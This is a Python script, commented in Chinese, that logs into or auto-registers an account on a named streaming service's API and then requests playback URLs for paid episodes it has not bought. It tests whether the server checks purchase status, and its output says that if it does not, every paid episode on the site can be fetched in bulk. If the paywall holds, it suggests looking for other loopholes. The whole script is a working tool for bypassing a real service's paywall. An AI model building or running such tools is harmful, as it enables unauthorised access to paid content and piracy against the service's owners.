# -*- coding: utf-8 -*-
"""
付费墙验证：登录后逐集试探 /api/video/play-auth，判断服务端到底校验什么
========================================================================
背景：
  - /video/play-auth/{episodeId} 无 token 时 401（全局鉴权守卫）
  - 免费集也要登录，所以「登录」是必要条件
  - 未知点：登录后，**未解锁的付费集**能否也拿到 playUrl

两种可能结果：
  A. 付费集也能拿到 playUrl  → 服务端只校验登录，不校验购买（可批量取全量资源）
  B. 付费集返回 403/402 等   → 服务端校验解锁状态（需要真金白银，或另找逻辑漏洞）

用法：
  # 1) 发码
  python verify_paywall.py --send-sms 13800138000
  python verify_paywall.py --send-email you@qq.com          # 仅 qq/163/outlook 等主流邮箱

  # 2) 登录（自动注册）并测试
  python verify_paywall.py --phone 13800138000 --code 123456
  python verify_paywall.py --email you@qq.com --code 123456

  # 3) 用已有 token 复测
  python verify_paywall.py --token <accessToken> --drama 260

产出：paywall_report.json
"""
import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request

BASE = "https://api.starry.wang/api"
UA = "okhttp/4.12.0"
HERE = os.path.dirname(os.path.abspath(__file__))
TOKEN_FILE = os.path.join(HERE, "token.json")
EP_CACHE = os.path.join(HERE, "episodes.json")


def req(method, path, body=None, token=None, timeout=25):
    url = path if path.startswith("http") else BASE + path
    headers = {"User-Agent": UA, "Accept": "application/json"}
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    if token:
        headers["Authorization"] = "Bearer " + token
    r = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw[:300]}
    except Exception as e:
        return -1, {"error": f"{type(e).__name__}: {e}"}


def save_token(d):
    json.dump(d, open(TOKEN_FILE, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
    print(f"[=] token 已存 {TOKEN_FILE}")


def auth(args):
    if args.send_sms:
        print("[sms]", req("POST", "/auth/sms-code", {"phone": args.send_sms}))
        return None
    if args.send_email:
        print("[email]", req("POST", "/auth/email/code", {"email": args.send_email}))
        return None
    if args.token:
        save_token({"accessToken": args.token})
        return args.token

    if not args.code:
        if os.path.exists(TOKEN_FILE):
            t = json.load(open(TOKEN_FILE, encoding="utf-8")).get("accessToken")
            if t:
                print("[i] 复用本地 token.json")
                return t
        return None

    ident = {}
    if args.phone:
        ident = {"phone": args.phone}
        reg = "/auth/register"
    elif args.email:
        ident = {"email": args.email}
        reg = "/auth/email/register"
    else:
        print("[!] 需要 --phone 或 --email")
        return None

    body = dict(ident, code=args.code)
    if args.password:
        body["password"] = args.password
    code, r = req("POST", "/auth/login", body)
    print("[login]", code, r.get("message") or "")
    if code == 200 and isinstance(r.get("data"), dict) and r["data"].get("accessToken"):
        save_token(r["data"])
        return r["data"]["accessToken"]

    if not body.get("password"):
        body["password"] = "Aa123456"
    code, r = req("POST", reg, body)
    print("[register]", code, r.get("message") or "")
    if code in (200, 201) and isinstance(r.get("data"), dict) and r["data"].get("accessToken"):
        save_token(r["data"])
        return r["data"]["accessToken"]

    code, r2 = req("POST", "/auth/login", dict(ident, password=body["password"]))
    print("[login2]", code, r2.get("message") or "")
    if isinstance(r2.get("data"), dict) and r2["data"].get("accessToken"):
        save_token(r2["data"])
        return r2["data"]["accessToken"]
    return None


def find_urls(o, acc=None):
    if acc is None:
        acc = []
    if isinstance(o, dict):
        for v in o.values():
            find_urls(v, acc)
    elif isinstance(o, list):
        for v in o:
            find_urls(v, acc)
    elif isinstance(o, str):
        if o.startswith("http") and o not in acc:
            acc.append(o)
    return acc


def load_episodes(drama_id):
    """优先读本地缓存，没有就现场抓"""
    if os.path.exists(EP_CACHE):
        try:
            cache = json.load(open(EP_CACHE, encoding="utf-8"))
            lst = cache.get(str(drama_id))
            if lst:
                print(f"[i] 分集来自本地缓存：{len(lst)} 集")
                return lst
        except Exception:
            pass
    code, r = req("GET", f"/episodes/drama/{drama_id}")
    if code == 200 and isinstance(r.get("data"), list):
        return r["data"]
    return []


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--send-sms")
    ap.add_argument("--send-email")
    ap.add_argument("--phone")
    ap.add_argument("--email")
    ap.add_argument("--code")
    ap.add_argument("--password", default="Aa123456")
    ap.add_argument("--token")
    ap.add_argument("--drama", type=int, default=260, help="要测的剧 ID，默认 260")
    ap.add_argument("--limit", type=int, default=0, help="最多测几集（0=全部）")
    args = ap.parse_args()

    token = auth(args)
    if not token:
        print("\n[!] 没拿到 token。先发码（--send-sms / --send-email），再带 --code 运行。")
        return

    # 0) 账号自身状态
    code, prof = req("GET", "/user/profile", token=token)
    print("\n[me]", code, json.dumps(prof.get("data") if isinstance(prof, dict) else prof,
                                     ensure_ascii=False)[:400])
    code, bal = req("GET", "/user/coin-balance", token=token)
    print("[余额]", code, json.dumps(bal.get("data") if isinstance(bal, dict) else bal,
                                    ensure_ascii=False)[:200])

    # 1) 取分集，按 price 分成免费 / 付费
    eps = load_episodes(args.drama)
    if not eps:
        print(f"[!] 剧 {args.drama} 没拿到分集")
        return
    free = [e for e in eps if not (e.get("price") or 0)]
    paid = [e for e in eps if (e.get("price") or 0) > 0]
    print(f"\n[剧 {args.drama}] 共 {len(eps)} 集 · 免费 {len(free)} · 付费 {len(paid)}")

    # 2) 抽样：免费集取前 2 集 + 付费集取前 3 集
    sample = free[:2] + paid[:3]
    if args.limit:
        sample = sample[:args.limit]

    results = []
    for ep in sample:
        eid = ep["id"]
        code, r = req("GET", f"/video/play-auth/{eid}", token=token)
        urls = find_urls(r) if code == 200 else []
        item = {
            "episodeId": eid,
            "episodeNumber": ep.get("episodeNumber"),
            "price": ep.get("price") or 0,
            "httpStatus": code,
            "code": r.get("code") if isinstance(r, dict) else None,
            "message": r.get("message") if isinstance(r, dict) else None,
            "gotUrl": bool(urls),
            "urls": urls[:3],
            "dataKeys": sorted((r.get("data") or {}).keys()) if isinstance(r.get("data"), dict) else None,
        }
        results.append(item)
        tag = "免费" if item["price"] == 0 else "付费"
        print(f"  第{item['episodeNumber']:>3}集 [{tag} {item['price']}豆] -> {code} "
              f"{'✅拿到地址' if item['gotUrl'] else '❌' } {item['message'] or ''}")
        if item["urls"]:
            print(f"      {item['urls'][0][:120]}")
        time.sleep(0.5)

    # 3) 结论
    fok = [r for r in results if r["price"] == 0 and r["gotUrl"]]
    pok = [r for r in results if r["price"] > 0 and r["gotUrl"]]
    fno = [r for r in results if r["price"] == 0 and not r["gotUrl"]]
    pno = [r for r in results if r["price"] > 0 and not r["gotUrl"]]

    print("\n" + "=" * 56)
    print(f"免费集：成功 {len(fok)} / 失败 {len(fno)}")
    print(f"付费集：成功 {len(pok)} / 失败 {len(pno)}")
    if pok:
        print("\n结论：⚠️  付费集也能拿到播放地址 —— 服务端只校验登录，不校验解锁状态")
        print("     => 可以批量取全站资源（含付费集）")
    elif pno and fok:
        print("\n结论：付费墙真实存在 —— 未解锁的付费集被服务端拒绝")
        print("     需要先解锁（嗨豆/VIP），或继续找其它漏洞")
    else:
        print("\n结论：数据不足，看上面的 httpStatus 与 message")
    print("=" * 56)

    json.dump({"drama": args.drama, "results": results},
              open(os.path.join(HERE, "paywall_report.json"), "w", encoding="utf-8"),
              ensure_ascii=False, indent=2)
    print("[=] 明细见 paywall_report.json")


if __name__ == "__main__":
    main()
